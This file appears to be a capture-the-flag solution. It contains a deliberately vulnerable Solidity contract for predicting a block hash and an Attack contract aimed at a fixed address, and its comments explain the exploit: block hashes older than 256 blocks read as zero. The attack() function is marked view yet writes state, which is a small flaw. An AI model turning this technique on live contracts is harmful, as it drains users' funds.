pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract Attack {
    PredictTheBlockHashChallenge externalContract;
    bytes32 hash;
    uint256 blockCounter;
    uint256 currentBlock;

    constructor() {
        externalContract = PredictTheBlockHashChallenge(
            0x3090fe4fff93A1C0F55E5bA52e3e7844AD691233
        );

        blockCounter = block.number + 1;
    }

    function attack()
        public
        view
        returns (
            bytes32,
            uint256,
            uint256
        )
    {
        currentBlock = block.number;
        hash = block.blockhash(blockCounter);
        return (hash, blockCounter, currentBlock);
    }
}

//hash of the given block - only works for 256 most recent, excluding current, blocks
//putting as value 0x0000000000000000000000000000000000000000000000000000000000000000
//submitted on 10560966
//run in 256 blockcs after 10561222
